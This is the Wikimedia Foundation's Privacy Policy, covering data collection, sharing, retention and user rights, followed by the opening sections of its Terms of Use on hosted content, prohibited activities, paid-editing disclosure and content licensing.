You are not required to create an account to read or contribute to a Wikimedia Site, except under rare circumstances. However, if you contribute without signing in, your contribution will be publicly attributed to the IP address associated with your device.

If you want to create a standard account, in most cases we require only a username and a password. However, if you choose not to provide an email address, we cannot help you recover your password.

More on Usernames

Your username will be publicly visible, so please be careful about revealing your real name or other Personal Information in your username. Your password is only used to verify that the account is yours. Your IP address is also automatically submitted to us, and we record it temporarily. This is to protect Wikimedia users and project content; in the event of abuse, IP addresses may be associated with usernames as part of an investigation. No other Personal Information is required: no name, no email address, no date of birth, and no credit card information.

Once created, user accounts cannot be removed entirely (although you can usually hide the information on your user page if you choose to). This is because your public contributions must be associated with their author (you!). In some circumstances, the Wikimedia communities can assist users with removing additional information related to their account from the projects.

To gain a better understanding of the demographics of our users, to localize our services and to learn how we can improve our services, we may ask you for more demographic information, such as gender or age, about yourself. We will tell you if such information is intended to be public or private, so that you can make an informed decision about whether you want to provide us with that information. Providing such information is always completely optional. If you do not want to, you do not have to—it is as simple as that.

LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



Some features we offer work better if we know what area you are in.

If you consent, we can use GPS (and other technologies commonly used to determine location) to show you more relevant content. We keep information obtained by these technologies confidential, except as provided in this Policy. You can learn more by checking out the list of examples of how we use these technologies in our FAQ.

Back to top


METADATA



Sometimes, we automatically receive location data from your device. For example, if you want to upload a photo on the Wikimedia Commons mobile app, we may receive metadata, such as the place and time you took the photo, automatically from your device. Please be aware that, unlike location information collected using GPS signals described above, the default setting on your mobile device typically includes the metadata in your photo or video upload to the Wikimedia Sites. If you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



Finally, when you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location.

Back to top



INFORMATION RELATED TO YOUR USE OF THE WIKIMEDIA SITES



We use certain technologies to collect information about how you use Wikimedia Sites.

Like other websites, we receive some information about you automatically when you visit the Wikimedia Sites.

We also use a variety of commonly-used technologies, like cookies, to collect information regarding how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We want to make the Wikimedia Sites better for you by learning more about how you use them. Examples of this might include how often you visit the Wikimedia Sites, what you like, what you find helpful, how you get to the Wikimedia Sites, and whether you would use a helpful feature more if we explained it differently. We also want this Policy and our practices to reflect our community's values. For this reason, we keep information related to your use of the Wikimedia Sites confidential, except as provided in this Policy.

Back to top


INFORMATION WE RECEIVE AUTOMATICALLY



Because of how browsers work, we receive some information automatically when you visit the Wikimedia Sites. This includes when you use an online tool on a third-party site that loads information coming from the Wikimedia Sites. This information includes the type of device you are using (possibly including unique device identification numbers, for some beta versions of our mobile applications), the type and version of your browser, your browser's language preference, the type and version of your device's operating system, in some cases the name of your internet service provider or mobile carrier, the website that referred you to the Wikimedia Sites, which pages you request and visit, and the date and time of each request you make to the Wikimedia Sites.

Put simply, we use this information to enhance your experience with Wikimedia Sites. For example, we use this information to administer the sites, provide greater security, and fight vandalism; optimize mobile applications, customize content and set language preferences, test features to see what works, and improve performance; understand how users interact with the Wikimedia Sites, track and study use of various features, gain understanding about the demographics of the different Wikimedia Sites, and analyze trends.

Back to top


INFORMATION WE COLLECT



We use a variety of commonly-used technologies, like cookies, to understand how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We actively collect some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage. These types of technologies may also be used in online tools on a third-party site that loads information from the Wikimedia Sites. We realize that some of these technologies do not have the best reputation in town and can be used for less-than-noble purposes. So we want to be as clear as we can about why we use these methods and the type of information we collect with them.

Depending on which technology we use, locally stored data may include text, Personal Information (like your IP address), and information about your use of the Wikimedia Sites (like your username or the time of your visit). See below for more information.

We use this information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. We will never use third-party cookies, unless we get your permission to do so. If you ever come across a third-party data collection tool that has not been authorized by you (such as one that may have been mistakenly placed by another user or administrator), please report it to us at privacy@wikimedia.org.

More on Locally Stored Data

Locally stored data, JavaScript, and tracking pixels help us do things like:

 * Provide you with a customizable experience, such as using cookies to know your language preference, to remember the user preferences you set so we can provide you with the customized look and feel that you want, and to tell you about interesting Wikimedia issues and events in your area.
 * Deliver more relevant content to you faster. For example, we use local storage to store your most recently read articles directly on your device, so they can be retrieved quickly. Also, we use cookies to learn about the topics searched so that we can optimize the search results we deliver to you.
 * Understand how you use the Wikimedia Sites, so that we know what works and what is useful. For example, we might use cookies to learn about the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.
 * Understand how you use the Wikimedia Sites across different devices, so that we can make our varied Wikimedia Sites more efficient and effective for you.
 * Make the Wikimedia Sites more convenient to use, such as by using cookies to maintain your session when you log in or to remember your username in the login field.

Want to know even more? You can read more about some of the specific cookies we use, when they expire, and what we use them for in our FAQ.

We believe this data collection helps improve your user experience, but you may remove or disable some or all locally stored data through your browser settings, depending on your browser. You can learn more about some options you have in our FAQ. While locally stored data may not be necessary to use our sites, some features will not function properly if you disable locally stored data.

While the examples above concerning information about you collected through the use of data collection tools are kept confidential in accordance with this Policy, please note that some information about the actions taken by your username is made publicly available through public logs alongside actions taken by other users. For example, a public log may include the date your account was created on a Wikimedia Site along with the dates that other accounts were created on a Wikimedia Site.

OTHER



LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



As stated above, we can use commonly-used location technologies to show you more relevant content. For example, our mobile apps can identify articles from the Wikimedia sites about points of interest near your location. As a reminder, you can consent to and/or deactivate our access to these location technologies at any time for example through the native OS functionalities on your mobile device, and still use the Wikimedia Sites.

METADATA



As stated above, we may automatically receive location data from your device. For example, if you upload a photo using the Wikimedia Commons mobile app, please be aware that the default setting on your mobile device typically results in the metadata associated with your photo being included in the upload. As a reminder, if you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

IP ADDRESSES



When you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location. We keep IP addresses confidential, except as provided in this Policy. If you are visiting Wikimedia Sites with your mobile device, we may use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

We use this location information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. For example, we use this information to provide greater security, optimize mobile applications, and learn how to expand and better support Wikimedia communities. We also use Personal Information in the manner described in the sections of this Policy titled "For Legal Reasons" and "To Protect You, Ourselves & Others."

SHARING


WHEN MAY WE SHARE YOUR INFORMATION?



We use and share your Personal Information when you give us specific permission to do so, for legal reasons, and in the other circumstances described below.

WITH YOUR PERMISSION



We share your Personal Information for a particular purpose, if you agree. For example, if you receive a scholarship and we ask permission to share your Personal Information with a local chapter. You can find more information in the list of examples in our FAQ.

Back to top


FOR LEGAL REASONS



We will disclose your Personal Information to public authorities or other persons in response to an official legal process only if we believe it to be legally valid. See also our Requests for user information procedures and guidelines. We will notify you of such requests when possible. We do so to further our legitimate interest and/or to comply with our legal obligations.

We will access, use, preserve, and/or disclose your Personal Information if we reasonably believe it necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. However, if we believe that a particular request for disclosure of a user's information is legally invalid or an abuse of the legal system and the affected user does not intend to oppose the disclosure themselves, we will try our best to fight it. We are committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your Personal Information in response to a legal demand. However, we may only provide notice if we are not legally restrained from contacting you, there is no credible threat to life or limb that is created or increased by disclosing the request, and you have provided us with an email address.

Nothing in this Privacy Policy is intended to limit any legal objections or defenses you may have to a third-party's request (whether it be civil, criminal, or governmental) to disclose your Personal Information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

For more information, see our Subpoena FAQ.

IF THE ORGANIZATION IS TRANSFERRED (REALLY UNLIKELY!)



In the unlikely event that the ownership of the Foundation changes, we will provide you 30 days' notice before any Personal Information is transferred to the new owners or becomes subject to a different privacy policy.

In the extremely unlikely event that ownership of all or substantially all of the Foundation changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), consistent with our legitimate interest, we will continue to keep your Personal Information confidential, except as provided in this Policy, and provide notice to you via the Wikimedia Sites and a notification on WikimediaAnnounce-L or similar mailing list at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different privacy policy.

TO PROTECT YOU, OURSELVES & OTHERS



We, or users with certain administrative rights, use and disclose Personal Information that is reasonably necessary to:

 * enforce or investigate potential violations of the Wikimedia Foundation or community-based policies;
 * protect our organization, infrastructure, employees, contractors, or the public; or
 * prevent imminent or serious bodily harm or death to a person.

We do so to manage our relationship with you, to further our legitimate interest, and/or to comply with our legal obligations.

We, or particular users with certain administrative rights as described below, need to use and share your Personal Information if it is reasonably believed to be necessary to enforce or investigate potential violations of our Terms of Use, this Privacy Policy, or any Wikimedia Foundation or user community-based policies. We may also need to access and share Personal Information to investigate and defend ourselves against legal threats or actions.

Wikimedia Sites are collaborative, with users writing most of the policies and selecting from amongst themselves people to hold certain administrative rights. These rights may include access to limited amounts of otherwise nonpublic information about recent contributions and activity by other users. They use this access to help protect against vandalism and abuse, fight harassment of other users, and generally try to minimize disruptive behavior on the Wikimedia Sites. These various user-selected administrative groups have their own privacy and confidentiality guidelines, but all such groups are supposed to agree to follow our Access to nonpublic personal data policy. These user-selected administrative groups are accountable to other users through checks and balances: users are selected through a community-driven process and overseen by their peers through a logged history of their actions. However, the legal names of these users are not known to the Wikimedia Foundation.

We hope that this never comes up, but we may disclose your Personal Information if we believe that it is reasonably necessary to prevent imminent and serious bodily harm or death to a person, or to protect our organization, employees, contractors, users, or the public. We may also disclose your Personal Information if we reasonably believe it necessary to detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. (Check out the list of examples in our FAQ for more information.)

TO OUR SERVICE PROVIDERS



We disclose Personal Information to our third-party service providers or contractors to help run or improve the Wikimedia Sites and provide services in support of our mission.

We use third-party service providers or contractors to help run or improve the Wikimedia Sites for you and other users. We give access to your Personal Information to these providers or contractors as needed to perform their services for us or to use their tools and services. We put requirements, such as confidentiality agreements, in place to help ensure that these service providers treat your Personal Information consistently with, and no less protective of your privacy than, the principles of this Policy. For further information, please see our FAQ.

If you are visiting Wikimedia Sites with your mobile device, we use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page.

TO UNDERSTAND & EXPERIMENT


 * We give volunteer developers and researchers access to systems that contain your Personal Information to allow them to protect, develop, and contribute to the Wikimedia Sites.
 * We also share non-Personal Information or aggregated information with third parties interested in studying the Wikimedia Sites.
 * When we share Personal Information with third parties for these purposes, we put reasonable technical and contractual protections in place to protect your Personal Information consistent with this Policy and our legitimate interest.

The open-source software that powers the Wikimedia Sites depends on the contributions of volunteer software developers, who spend time writing and testing code to help it improve and evolve with our users' needs. To facilitate their work, we give some developers limited access to systems that contain your Personal Information, but only as reasonably necessary for them to develop and contribute to the Wikimedia Sites.

Similarly, we share non-Personal Information or aggregated information with researchers, scholars, academics, and other interested third parties who wish to study the Wikimedia Sites. Sharing this Personal Information helps them understand usage, viewing, and demographics statistics and patterns. They then can share their findings with us and our users so that we can all better understand and improve the Wikimedia Sites.

When we give access to Personal Information to third-party developers or researchers, we put requirements, such as reasonable technical and contractual protections, in place to help ensure that these service providers treat your Personal Information consistently with the principles of this Policy and in accordance with our instructions. If these developers or researchers later publish their work or findings, we ask that they not disclose your Personal Information. Please note that, despite the obligations we impose on developers and researchers, we cannot guarantee that they will abide by our agreement, nor do we guarantee that we will regularly screen or audit their projects. (You can learn more about re-identification in our FAQ.)

Back to top


BECAUSE YOU MADE IT PUBLIC



Information that you post is public and can be seen and used by everyone.

Any information you post publicly on the Wikimedia Sites is just that – public. For example, if you put your mailing address on your talk page, that is public, and not specifically protected by this Policy. And if you edit without registering or logging into your account, your IP address will be seen publicly. Please think carefully about your desired level of privacy before you disclose Personal Information on your user page or elsewhere.

PROTECTION


HOW DO WE PROTECT YOUR PERSONAL INFORMATION?



We use a variety of physical and technical measures, policies, and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.

We strive to protect your Personal Information from unauthorized access, use, or disclosure. We use a variety of physical and technical measures, policies, and procedures (such as access control procedures, network firewalls, and physical security) designed to protect our systems and your Personal Information. Unfortunately, there is no such thing as completely secure data transmission or storage, so we cannot guarantee that our security will not be breached (by technical measures or through violation of our policies and procedures).

We will never ask for your password by email (but may send you a temporary password via email if you have requested a password reset). If you ever receive an email that requests your password, please let us know by sending it to privacy@wikimedia.org, so we can investigate the source of the email.

Back to top



HOW LONG DO WE KEEP YOUR DATA?



Except as otherwise stated in this Policy, we only keep your Personal Information as long as necessary to maintain, understand and improve the Wikimedia Sites or to comply with applicable law.

Once we receive Personal Information from you, we keep it for the shortest possible time that is consistent with the maintenance, understanding, and improvement of the Wikimedia Sites, and our obligations under applicable law. In most instances, Personal Information is deleted, aggregated or de-identified after 90 days. Non-Personal Information may be retained indefinitely as appropriate. (Check out the list of examples in our FAQ.)

Please remember that when you make a contribution to any Wikimedia Site, the page history will show when your contribution was made, your username (if you are signed in), or your IP address (if you edit while not logged in). The transparency of the projects' contribution and revision histories is critical to their efficacy and trustworthiness. To learn more about our data retention practices, see our data retention guidelines.

YOUR RIGHTS



If you would like to request access to or removal of your Personal Information, you may contact us.

For information about how you may request removal of your Personal Information, or other rights you may have with respect to your Personal Information, see our FAQ. If you would like to request to access, update or restrict/object to the processing of Personal Information, or receive a copy of your Personal Information for purposes of transmitting it to another organization, you may Contact Us. We will respond to your request consistent with applicable law.

Please note also that you may be able to exercise some of these rights without our intervention. For example, if you are a registered user, you can access and update some Personal Information in your Preferences, as well as download your user account data. You may also manage what kinds of notifications you receive and how often you receive them by going to your Notifications Preferences.

IMPORTANT INFO

For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.




WHERE IS THE FOUNDATION & WHAT DOES THAT MEAN FOR ME?



The Wikimedia Foundation is a non-profit organization based in San Francisco, California, with servers and data centers located in the U.S. If you decide to use Wikimedia Sites, whether from inside or outside of the U.S., you understand that your Personal Information will be collected, transferred, stored, processed, disclosed and otherwise used in the U.S. as described in this Privacy Policy. You also understand that your information may be transferred by us from the U.S. to other countries, which may have different or less stringent data protection laws than your country, in connection with providing services to you.

Back to top



OUR RESPONSE TO DO NOT TRACK (DNT) SIGNALS



We are strongly committed to protecting users' Personal Information. Under this Policy, we may share your information only under particular situations, which you can learn more about in the "When May We Share Your Information" section of this Privacy Policy. In particular, we do not share your Personal Information for marketing purposes.

Because we protect all users in accordance with this Privacy Policy, we do not change our behavior in response to a web browser's "do not track" signal. For more information regarding Do Not Track signals and how we handle them, please visit our FAQ.

Back to top



CHANGES TO THIS PRIVACY POLICY



Substantial changes to this Policy will not be made until after a public comment period of at least 30 days.

Because things naturally change over time and we want to ensure our Privacy Policy accurately reflects our practices and the law, it may be necessary to modify this Privacy Policy from time to time. We reserve the right to do so in the following manner:

 * In the event of substantial changes, we will provide the proposed changes to our users in at least three (3) languages (selected at our discretion) for an open comment period lasting at least thirty (30) calendar days. Prior to the start of any comment period, we will provide notice of such changes and the opportunity to comment via the Wikimedia Sites, and via a notification on WikimediaAnnounce-L or a similar mailing list.
 * For minor changes, such as grammatical fixes, administrative or legal changes, or corrections of inaccurate statements, we will post the changes and, when possible, provide at least three (3) calendar days' prior notice via WikimediaAnnounce-L or similar mailing list.

We ask that you please review the most up-to-date version of our Privacy Policy. Your continued use of the Wikimedia Sites after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of this Privacy Policy on your part.

Wikimedia Foundation Terms of Use


This is a summary of the Terms of Use. To read the full terms, scroll down or click here.

Our Terms of Use

Imagine a world in which every single human being can freely share in the sum of all knowledge. That's our commitment. – Our Vision Statement

Welcome to Wikimedia! The Wikimedia Foundation, Inc. ("we" or "us" or "Foundation"), is a non-profit charitable organization, headquartered in San Francisco, California, United States, whose mission is to empower and engage people around the world to collect and develop content under a free license or in the public domain, and to disseminate it effectively and globally, free of charge.

To support our vibrant community, we provide the essential infrastructure and organizational framework for the development of multilingual wiki projects and their editions (as explained on our Wikimedia Projects page) (hereby referred to as "Projects") and other endeavors which serve this mission. We strive to make and keep educational and informational content from the Projects available on the internet free of charge, in perpetuity.

We welcome you ("you" or the "user") as a reader, or contributor of the Projects, and we encourage you to join the Wikimedia community. Before you participate, however, we ask that you please read and agree to the following Terms of Use ("Terms of Use").


OVERVIEW

These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with rare exceptions, such as under policies like these Terms of Use, for legal compliance, or when faced with urgent threats of serious harm). This means that editorial control is in the hands of you and your fellow users who create and manage the content.

The community – the network of users who are constantly building and using the Projects and/or their websites (hereby referred to as "Project Websites") – is the principal means through which the goals of the mission are achieved. The community contributes to and helps govern our Projects and Project Websites. The community also undertakes the critical function of creating and enforcing policies for the specific Project editions (such as the different language editions for the Wikipedia Project or the Wikimedia Commons multilingual edition).

You, the user, are welcome to join as a contributor, editor, or author, but you should follow the policies that govern each of the independent Project editions, including the Universal Code of Conduct (UCoC), which apply to all Project editions. The largest of our Projects is Wikipedia, but we host other Projects too, each with different objectives and work methods. Each Project edition has a team of contributors, editors or authors who work together to create and manage the content on that Project edition. You are welcome to join these teams and work with them to improve these Projects. Since we are dedicated to making content freely accessible to the public, content you contribute is made available under a free license or released in the public domain.

Please be aware that you are legally responsible for all of your contributions, edits, and reuse of Wikimedia content under the laws of the United States of America and other applicable laws (which may include laws where you or the subject of your contributions are located). This means it is important that you exercise caution when posting, modifying or reusing content. In light of this responsibility, we have some rules about what you cannot do, most of which are either for your own protection or for the protection of other users like yourself. Please keep in mind that the content we host is for general informational purposes only, so if you need expert advice for a particular question (such as medical, legal, or financial issues), you should seek the help of an appropriate professional. We also include other important notices and disclaimers, so please read these Terms of Use in their entirety.

For clarity, other organizations, such as local Wikimedia chapters and associations, that may share in the same mission are nevertheless legally independent and separate from the Wikimedia Foundation. Unless otherwise stated by the Foundation as an authorized party on a given Project's Website, those other organizations have no responsibility for the operations of the Project's Website or its content.




1. OUR SERVICES

The Wikimedia Foundation is dedicated to encouraging the growth, development, and distribution of free multilingual content, and to hosting the full content of these wiki-based Projects for the public free of charge. Our role is to host some of the largest collaboratively edited reference Projects in the world, which can be found here. However, we act only as a hosting service provider, maintaining the infrastructure and organizational framework. This infrastructure and framework allow our users to build the Projects by contributing and editing content themselves. They also allow our users to reuse that content. The infrastructure we maintain includes specialized technological infrastructure that enables users to programmatically interact with and reuse content on Projects (referred to as "Application Programming Interface" or "APIs"), and mobile applications.

As used throughout the rest of the Terms of Use, our services consist of: The Project Websites we host, technological infrastructure that we maintain, and any technical spaces that we host for the maintenance and improvement of our Projects.

Because of our unique role, there are a couple of things you should be aware of when considering our relationship to you, the Projects, and other users:

 1. We do not take an editorial role: Because the Projects are collaboratively edited, the vast majority of the content that we host is provided by users, and we do not take an editorial role. This means that we generally do not monitor or edit the content of the Project Websites, and we do not take any responsibility for this content. Similarly, unless we have expressly stated otherwise, we do not endorse any opinions expressed via our services, and we do not represent or guarantee the truthfulness, accuracy, or reliability of any submitted community content on the Projects.
 2. You are responsible for your own actions: You are legally responsible for your edits and contributions on the Projects, your reuse of content on the Projects, your use of the APIs, and your use of our services more generally. For your own protection you should exercise caution and avoid taking any actions that may result in criminal or civil liability under any applicable laws. For clarity, applicable law includes at least the laws of the United States of America and the State of California. For other countries, this is determined on a case-by-case basis. Although we may not agree with such actions, we warn users—particularly the editors, contributors, and authors—that non-U.S. authorities may seek to apply other country laws to you, including local laws where you live or where you view or edit content. We generally cannot offer any protection, guarantee, immunity or indemnification against the application of such laws.




2. PRIVACY POLICY

We ask that you review the terms of our Privacy Policy, so that you are aware of how we collect and use your information.




3. CONTENT WE HOST

 1. You may find some material objectionable or erroneous: Because we host a wide array of content that is produced or gathered by fellow users, you may encounter material that you find offensive, erroneous, misleading, mislabeled, or otherwise objectionable. We therefore ask that you use common sense and proper judgment when using our services.
 2. The Projects' content is for general informational purposes only: Although our Projects host a great deal of information that pertains to professional topics, including medical, legal, or financial issues, this content is presented for general informational purposes only. It should not be taken as professional advice. Please seek independent professional counseling from someone who is licensed or qualified in the applicable area in lieu of acting on any information, opinion, or advice contained in one of the Project Websites.




4. REFRAINING FROM CERTAIN ACTIVITIES

The Projects hosted by the Wikimedia Foundation only exist because of the vibrant community of users like you who collaborate to write, edit, and curate the content. We happily welcome your participation in this community. We encourage you to be civil and polite in your interactions with others in the community, to act in good faith, and to make edits and contributions aimed at furthering the mission of the shared Project. We ask that all users review and follow the Universal Code of Conduct ("UCoC"), which lays out requirements for collegial, civil collaboration across all Projects that we host.

Certain activities, whether legal or illegal under the applicable law, may be harmful to other users and violate our rules, and some activities may also subject you to liability. Therefore, for your own protection and for that of other users, you may not engage in such activities on, or otherwise using, our Projects. These activities include:

Harassing and Abusing Others
 * Engaging in threats, stalking, spamming, vandalism, or harassment as described in the UCoC;
 * Transmitting chain mail, junk mail, or spam to other users;
 * Posting or modifying content with the intention to seriously harm others, such as deliberate inducements to self-harm, or deliberate triggering of epilepsy.

Violating the Privacy of Others
 * Infringing the privacy rights of others under the laws of the United States of America or other applicable laws (which may include the laws where you live or where you view or edit content);
 * Soliciting personally identifiable information for the purposes of harassment, exploitation, or violation of privacy, or for any promotional or commercial purpose not explicitly approved by the Wikimedia Foundation; and
 * Soliciting personally identifiable information from anyone under the age of 18 years, or under the age of majority where you are if higher than 18 years, for an illegal purpose or violating any applicable law regarding the health or well-being of minors.

Engaging in False Statements, Impersonation, or Fraud
 * Intentionally or knowingly posting content that constitutes libel or defamation under the laws of the United States of America;
 * Posting or modifying content with the intent to deceive or mislead others;
 * Attempting to impersonate another user or individual, misrepresenting your affiliation with any individual or entity, hiding your affiliation with any individual or entity when disclosure is required by these terms or local Project policy, or using the name or username of another person with the intent to deceive; and
 * Engaging in fraud.

Committing Infringement of Intellectual Property Rights
 * Infringing copyrights, trademarks, patents, or other proprietary rights under the applicable law.

Misusing Our Services for Other Illegal Purposes
 * Posting child pornography or any other content that violates applicable law concerning child pornography or child sexual abuse material, or encouraging, grooming, or advocating for others to create or share such material;
 * Posting or trafficking in obscene material that is unlawful under applicable law; and
 * Using the services in a manner that is inconsistent with applicable law.

Engaging in Disruptive and Illegal Misuse of Facilities
 * Posting or distributing content that contains any viruses, malware, worms, Trojan horses, malicious code, or other device that could harm our technical infrastructure or system or that of other users;
 * Engaging in automated uses of the Project Websites that are abusive or disruptive of the services, violate acceptable usage policies where available, or have not been approved by the Wikimedia community;
 * Disrupting the services by placing an undue burden on an API, Project Website or the networks or servers connected with a particular Project Website;
 * Disrupting the services by inundating any of the Project Websites with communications or other traffic that suggests no serious intent to use the Project website for its stated purpose;
 * Knowingly accessing, tampering with, or using any of our non-public areas in our computer systems without authorization; and
 * Probing, scanning, or testing the vulnerability of any of our technical systems or networks unless all the following conditions are met:

 * such actions do not unduly abuse or disrupt our technical systems or networks;
 * such actions are not for personal gain (except for credit for your work);
 * you report any vulnerabilities to the relevant developers (or fix it yourself); and
 * you do not undertake such actions with malicious or destructive intent.



Shortcut:
PAID
Paid Contributions Without Disclosure
 * You must disclose each and any employer, client, intended beneficiary and affiliation with respect to any contribution for which you receive, or expect to receive, compensation. You must make that disclosure in at least one of the following ways:

 * a statement on your user page,
 * a statement on the talk page accompanying any paid contributions, or
 * a statement in the edit summary accompanying any paid contributions.

 * In addition, if you make a public posting off the Projects advertising editing services on Wikipedia in exchange for compensation of any kind, you must disclose all Wikipedia accounts you have used or will use for this service in the public posting on the third-party service.
 * Applicable law, or Project-specific policies and Foundation policies and guidelines, such as those addressing conflicts of interest, may further limit paid contributions or require more detailed disclosure. For example, infringing Wikimedia Trademarks (defined hereinafter at Section 6) to advertise paid editing services, removing disclosures on previously adequately disclosed paid edits, or logged-out paid editing in a manner that makes adequate disclosure a practical impossibility violate this section.
 * A Wikimedia Project community may adopt an alternative paid contribution disclosure policy which may supplement or replace this section. If a Project adopts an alternative disclosure policy, you may comply with that policy instead of the requirements in this section (titled "Paid Contributions Without Disclosure") when contributing to that particular Project.

For more information, please read our FAQ on disclosure of paid contributions.

We reserve the right to exercise our enforcement discretion with respect to the provisions in section 4 of these Terms of Use. Where required, enforcement of these terms may include actions not listed in the Wikimedia Foundation Office Action Policy. If enforcement is required in new circumstances, we will make an effort within at most one (1) year to update the Office Action Policy to catalog the new type of action.

Marketing Company Mediations

Undisclosed editing by users receiving compensation creates an unreasonable burden on volunteer editors who investigate and enforce community policies. Therefore, for violations of this section related to undisclosed paid editing, you agree to submit to binding "Med-Arb" (a "Marketing Company Mediation") as described in section 14 of these Terms of Use.




5. PASSWORD SECURITY

You are responsible for safeguarding your own password and other security credentials, and should never disclose them to any third party.




6. TRADEMARKS

Although you have considerable freedoms for reuse of the content on the Project Websites, it is important that, at the Wikimedia Foundation, we protect our trademark rights so that we can protect our users from fraudulent impersonators. Because of this, we ask that you please respect our trademarks. All Wikimedia Foundation trademarks belong to the Wikimedia Foundation, and any use of our trade names, trademarks, service marks, logos, or domain names must be in compliance with these Terms of Use and in compliance with our Trademark Policy.




7. LICENSING OF CONTENT

To grow the commons of free knowledge and free culture, all users contributing to the Projects or Project Websites are required to grant broad permissions to the general public to redistribute and reuse their contributions freely, so long as that use is properly attributed and the same freedom to reuse and redistribute is granted to any derivative works. In keeping with our goal of providing free information to the widest possible audience, we require that when necessary all submitted content be licensed so that it is freely reusable by anyone who may access it.

You agree to the following licensing requirements:

 1. Text to which you hold the copyright: When you submit text to which you hold the copyright, you agree to license it under:
    * Creative Commons Attribution-ShareAlike 4.0 International License ("CC BY-SA 4.0"), and
    * GNU Free Documentation License ("GFDL") (unversioned, with no invariant sections, front-cover texts, or back-cover texts).
    Reusers may comply with either license or both.
    The only exception is if the Project edition or feature requires a different license. In that case, you agree to license any text you contribute under the particular license prescribed by the Project edition or the feature. Please note that these licenses do allow commercial uses of your contributions, as long as such uses are compliant with the terms of the respective licenses. Where you own Sui Generis Database Rights covered by CC BY-SA 4.0, you waive these rights. As an example, this means facts you contribute to the projects may be reused freely without attribution.
 2. Attribution: Attribution is an important part of these licenses. We consider it giving credit where credit is due – to authors like yourself. When you contribute text, you agree to be attributed in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the article to which you contributed (since each article has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the relevant license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
 3. Importing text: You may import text that you have found elsewhere or that you have co-authored with others, but in such case you represent and warrant that the text is available under terms that are compatible with CC BY-SA (or, as explained above, another license when exceptionally required by the Project edition or feature). For a list of compatible licenses, see Creative Commons. You shall not import content that is available solely under GFDL.
    You agree that, if you import text under a CC license that requires attribution, you must credit the author(s) in a reasonable fashion. Where such credit is commonly given through page histories (such as Wikimedia-internal copying), it is sufficient to give attribution in the edit summary, which is recorded in the page history, when importing the text. The attribution requirements are sometimes too intrusive for particular circumstances (regardless of the license), and there may be instances where the Wikimedia community decides that imported text cannot be used for that reason.
 4. Non-text media: Non-text media on the Projects are available under a variety of different licenses that support the general goal of allowing unrestricted reuse and redistribution. When you contribute non-text media, you agree to comply with the requirements for such licenses as described in our Licensing Policy, and also comply with the requirements of the specific Project edition or feature to which you are contributing. Also see the Wikimedia Commons Licensing Policy for more information on contributing non-text media to Wikimedia Commons.
 5. No revocation of license: Except as consistent with your license, you agree that you will not unilaterally revoke or seek invalidation of any license that you have granted under these Terms of Use for text content or non-text media contributed to the Projects or features, even if you terminate use of our services.
 6. Public domain content: Content that is in the public domain is welcome. It is important however that you confirm the public domain status of the content under the law of the United States of America as well as the laws of any other countries as required by the specific Project edition. When you contribute content that is in the public domain, you warrant that the material is actually in the public domain, and you agree to label it appropriately.
 7. Re-use: Reuse of content that we host is welcome, though exceptions exist for content contributed under "fair use" or similar exemptions under applicable copyright law. Any reuse must comply with the underlying license(s).
    When you reuse or redistribute a text page developed by the Wikimedia community, you agree to attribute the authors in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the page or pages that you are reusing (since each page has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
    
    If the text content was imported from another source, it is possible that the content is licensed under a compatible CC BY-SA license but not GFDL (as described in "Importing text," above). In that case, you agree to comply with the compatible CC BY-SA license and do not have the option to relicense it under GFDL. To determine the license that applies to the content that you seek to reuse or redistribute, you should review the page footer, page history, and discussion page.
    
    In addition, please be aware that text that originated from external sources and was imported into a Project may be under a license that attaches additional attribution requirements. Users agree to indicate these additional attribution requirements clearly. Depending on the Project, such requirements may appear, for example, in a banner or other notations pointing out that some or all of the content was originally published elsewhere. Where there are such visible notations, reusers should preserve them.
    
    For any non-text media, you agree to comply with the applicable license under which the work has been made available (which can be discovered by clicking on the work and looking at the licensing section on its description page or reviewing an applicable source page for that work). When reusing any content that we host, you agree to comply with the relevant attribution requirements as they pertain to the underlying license or licenses.
